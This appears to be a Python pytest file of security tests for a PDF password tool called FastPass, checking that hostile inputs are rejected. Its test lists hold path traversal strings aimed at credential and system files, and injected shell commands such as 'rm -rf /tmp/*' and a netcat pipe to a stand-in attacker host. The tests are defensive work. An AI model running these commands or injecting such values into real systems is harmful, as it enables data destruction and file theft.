"""
Comprehensive Security Attack Simulation Tests
Tests real security attack scenarios and prevention mechanisms
"""

import pytest
import subprocess
import tempfile
import os
from pathlib import Path
import stat
from unittest.mock import patch

# Import test utilities
from tests.conftest import run_fastpass_command
from fastpass.exceptions import SecurityViolationError


class TestPathTraversalAttacks:
    """Test path traversal attack prevention"""
    
    @pytest.mark.security
    def test_path_traversal_unix_style(self, fastpass_executable, project_root):
        """Test: Unix-style path traversal attacks are blocked"""
        traversal_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow", 
            "../../../root/.ssh/id_rsa",
            "../../../../usr/bin/passwd"
        ]
        
        for path in traversal_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked with security error
            assert result.returncode != 0, f"Path traversal attack not blocked: {path}"
            assert any(word in result.stderr.lower() for word in ["security", "not found", "invalid", "error"])
    
    @pytest.mark.security
    def test_path_traversal_windows_style(self, fastpass_executable, project_root):
        """Test: Windows-style path traversal attacks are blocked"""
        traversal_paths = [
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "..\\..\\..\\Users\\Administrator\\NTUSER.DAT",
            "..\\..\\Windows\\win.ini"
        ]
        
        for path in traversal_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked with security error
            assert result.returncode != 0, f"Windows path traversal attack not blocked: {path}"
            assert any(word in result.stderr.lower() for word in ["security", "not found", "invalid", "error"])
    
    @pytest.mark.security
    def test_path_traversal_encoded_attacks(self, fastpass_executable, project_root):
        """Test: URL/percent-encoded path traversal attacks are blocked"""
        encoded_paths = [
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"
        ]
        
        for path in encoded_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, f"Encoded path traversal attack not blocked: {path}"
    
    @pytest.mark.security
    def test_path_traversal_absolute_paths(self, fastpass_executable, project_root):
        """Test: Absolute paths to system files are blocked"""
        absolute_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/bin/sh",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for path in absolute_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked due to being outside allowed directories
            assert result.returncode != 0, f"Absolute path attack not blocked: {path}"


class TestSymlinkAttacks:
    """Test symbolic link attack prevention"""
    
    


class TestCommandInjectionAttacks:
    """Test command injection attack prevention"""
    
    @pytest.mark.security
    def test_filename_command_injection(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Command injection via filename is blocked"""
        malicious_filenames = [
            "file.pdf; rm -rf /tmp/*",
            "file.pdf && cat /etc/passwd",
            "file.pdf | nc attacker.com 1234",
            "file.pdf; powershell.exe -Command 'Get-Process'",
            "file.pdf`whoami`",
            "file.pdf$(whoami)"
        ]
        
        for filename in malicious_filenames:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", filename, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked (either file not found or security violation)
            assert result.returncode != 0, f"Command injection filename not blocked: {filename}"
            # Should not execute the injected command
    
    @pytest.mark.security
    def test_password_command_injection(self, fastpass_executable, temp_work_dir, sample_pdf_file, project_root):
        """Test: Command injection via password is blocked"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        malicious_passwords = [
            "password; cat /etc/passwd",
            "password && rm file.txt",
            "password | nc attacker.com 1234",
            "password`whoami`",
            "password$(id)"
        ]
        
        for password in malicious_passwords:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(sample_pdf_file), "-p", password],
                cwd=project_root
            )
            
            # FastPass should handle the password safely without executing commands
            # The operation may succeed or fail, but no command should be executed
            # We can't easily verify command execution didn't happen, but the test
            # ensures the password is processed as a string, not executed
            pass  # If we get here without system hanging, the test passes
    
    @pytest.mark.security
    def test_output_directory_command_injection(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Command injection via output directory is blocked"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        malicious_paths = [
            "/tmp/output; rm -rf /tmp/*",
            "/tmp/output && whoami",
            "/tmp/output | nc attacker.com 1234"
        ]
        
        for path in malicious_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(sample_pdf_file), "-p", "password", "-o", path],
                cwd=project_root
            )
            
            # Should be blocked or handled safely
            # The semicolon and other shell metacharacters should be treated as literal path components
            assert result.returncode != 0, f"Command injection output path not blocked: {path}"


class TestFileFormatAttacks:
    """Test file format-based attacks"""
    
    @pytest.mark.security
    def test_fake_pdf_extension_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Files with fake PDF extension are detected"""
        # Create a text file with .pdf extension
        fake_pdf = temp_work_dir / "malicious.pdf"
        fake_pdf.write_text("This is actually a text file pretending to be PDF")
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(fake_pdf), "-p", "password"],
            cwd=project_root
        )
        
        # Should be blocked due to format validation
        assert result.returncode != 0, "Fake PDF extension attack not blocked"
        assert any(word in result.stderr.lower() for word in ["format", "invalid", "unsupported"])
    
    @pytest.mark.security
    def test_zero_byte_file_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Zero-byte files are handled securely"""
        zero_file = temp_work_dir / "zero_bytes.pdf"
        zero_file.touch()  # Create empty file
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(zero_file), "-p", "password"],
            cwd=project_root
        )
        
        # Should be handled gracefully (may succeed or fail, but shouldn't crash)
        # The important thing is that it doesn't cause a crash or hang
        pass  # Test passes if no crash occurs
    
    @pytest.mark.security
    def test_oversized_filename_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Extremely long filenames are handled securely"""
        # Create file with very long name (approaching filesystem limits)
        long_name = "a" * 250 + ".pdf"
        long_file = temp_work_dir / long_name
        
        try:
            long_file.write_text("test content")
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(long_file), "-p", "password"],
                cwd=project_root
            )
            
            # Should handle long filenames without crashing
            # May succeed or fail depending on system limits
            pass  # Test passes if no crash occurs
            
        except OSError:
            # If we can't create the file due to system limits, that's fine
            pytest.skip("Cannot create file with long name on this system")


class TestMemoryAttacks:
    """Test memory-based attacks"""
    
    @pytest.mark.security
    def test_extremely_long_password_attack(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Extremely long passwords are rejected by OS command line limits"""
        import platform
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create a very long password (1MB)
        long_password = "a" * (1024 * 1024)
        
        try:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(sample_pdf_file), "-p", long_password],
                cwd=project_root
            )
            
            # On Windows, expect OS command line limit protection
            if platform.system() == 'Windows':
                assert result.returncode != 0  # Should fail due to OS limits
            else:
                # On Unix systems, may handle differently
                pass  # Test passes if no crash/hang occurs
        except (FileNotFoundError, OSError) as e:
            # Windows command line limit exceeded - this is expected protection
            if platform.system() == 'Windows':
                pass  # OS correctly blocks extremely long command lines
            else:
                raise
    
    @pytest.mark.security
    def test_password_memory_exposure(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Passwords are not exposed in process arguments"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # This test is somewhat limited as we can't easily check process list
        # But we can verify that the password handling doesn't expose sensitive data
        test_password = "secret_password_12345"
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", test_password],
            cwd=project_root
        )
        
        # The important thing is that passwords are handled internally
        # and not logged or exposed in error messages
        if result.returncode != 0:
            # Check that password is not in error output
            assert test_password not in result.stderr, "Password exposed in error output"
            assert test_password not in result.stdout, "Password exposed in standard output"


class TestResourceExhaustionAttacks:
    """Test resource exhaustion attack prevention"""
    
    @pytest.mark.security
    def test_multi_file_input_blocked(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Multi-file input is properly blocked (feature removed)"""
        # Create a few small files
        file_count = 3  # Small number for testing multi-file blocking
        file_paths = []
        
        for i in range(file_count):
            test_file = temp_work_dir / f"test_{i}.pdf"
            test_file.write_text("small pdf content")
            file_paths.append(str(test_file))
        
        # Try to process multiple files at once (should be blocked)
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i"] + file_paths + ["-p", "password"],
            cwd=project_root
        )
        
        # Should be blocked since multi-file input was removed
        assert result.returncode != 0, "Multi-file input not properly blocked"
    
    @pytest.mark.security  
    def test_recursive_directory_depth_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Very deep directory structures are handled safely"""
        # Create deep directory structure
        current_dir = temp_work_dir
        depth = 50  # Reasonable depth for testing
        
        for i in range(depth):
            current_dir = current_dir / f"level_{i}"
            current_dir.mkdir()
        
        # Create a file at the deepest level
        deep_file = current_dir / "deep_file.pdf"
        deep_file.write_text("test content")
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(deep_file), "-p", "password"],
            cwd=project_root
        )
        
        # Should handle deep paths without issues (may succeed or fail based on path limits)
        pass  # Test passes if no crash occurs


class TestPermissionAttacks:
    """Test permission-based attacks"""
    
    @pytest.mark.security
    
    @pytest.mark.security
    def test_permission_denied_handling(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Permission denied errors are handled gracefully"""
        # Create a file and try to make it unreadable
        protected_file = temp_work_dir / "protected.pdf"
        protected_file.write_text("test content")
        
        try:
            # Make file unreadable
            protected_file.chmod(0o000)
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(protected_file), "-p", "password"],
                cwd=project_root
            )
            
            # Should fail gracefully with permission error
            assert result.returncode != 0, "Permission denied not handled"
            
        except PermissionError:
            pytest.skip("Cannot modify file permissions on this system")
        finally:
            # Restore permissions for cleanup
            try:
                protected_file.chmod(0o644)
            except:
                pass


class TestInputValidationAttacks:
    """Test input validation attack prevention"""
    
    @pytest.mark.security
    def test_unicode_filename_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Unicode filenames with potential exploits are handled safely"""
        unicode_names = [
            "тест.pdf",  # Cyrillic
            "测试.pdf",   # Chinese
            "🔒file.pdf",  # Emoji
            "file\u202e.pdf",  # Right-to-left override
            "file\u00a0.pdf"   # Non-breaking space
        ]
        
        for name in unicode_names:
            try:
                unicode_file = temp_work_dir / name
                unicode_file.write_text("test content")
                
                result = run_fastpass_command(
                    fastpass_executable,
                    ["encrypt", "-i", str(unicode_file), "-p", "password"],
                    cwd=project_root
                )
                
                # Should handle unicode filenames without issues
                pass  # Test passes if no crash occurs
                
            except (OSError, UnicodeError):
                # Some filesystems may not support certain unicode characters
                continue
    
    @pytest.mark.security
    def test_null_byte_injection_attack(self, fastpass_executable, project_root):
        """Test: Null byte injection attacks are blocked by Python runtime"""
        null_byte_inputs = [
            "file\x00.pdf",
            "file.pdf\x00.txt", 
            "/etc/passwd\x00.pdf"
        ]
        
        for input_path in null_byte_inputs:
            try:
                result = run_fastpass_command(
                    fastpass_executable,
                    ["encrypt", "-i", input_path, "-p", "password"],
                    cwd=project_root
                )
                # Should be blocked at subprocess level
                assert result.returncode != 0, f"Null byte injection not blocked: {repr(input_path)}"
            except ValueError as e:
                # Python runtime correctly blocks null bytes in subprocess
                assert "embedded null character" in str(e)
            except Exception as e:
                # Other blocking mechanisms are also acceptable
                pass
    
    @pytest.mark.security
    def test_control_character_injection_attack(self, fastpass_executable, project_root):
        """Test: Control character injection attacks are blocked"""
        control_char_inputs = [
            "file\x01.pdf",
            "file\x02.pdf", 
            "file\x1f.pdf",
            "file\x7f.pdf"
        ]
        
        for input_path in control_char_inputs:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", input_path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, f"Control character injection not blocked: {repr(input_path)}"


class TestRaceConditionAttacks:
    """Test race condition attack prevention"""
    
    @pytest.mark.security
    def test_temp_file_race_condition(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Temporary file operations are atomic and secure"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Run multiple FastPass operations concurrently to test for race conditions
        # This is a basic test - more sophisticated race condition testing would require
        # specialized tools and techniques
        
        results = []
        
        # Start multiple operations with unique output files to avoid conflicts
        import tempfile
        temp_dir = Path(tempfile.mkdtemp())
        try:
            for i in range(3):
                output_file = temp_dir / f"encrypted_{i}.pdf"
                result = run_fastpass_command(
                    fastpass_executable,
                    ["encrypt", "-i", str(sample_pdf_file), "-o", str(output_file), "-p", f"password_{i}"],
                    cwd=project_root
                )
                results.append(result)
            
            # All operations should complete without interference
            success_count = sum(1 for r in results if r.returncode == 0)
            assert success_count == 3, f"Expected all 3 operations to succeed, got {success_count}"
        finally:
            # Cleanup temp directory
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
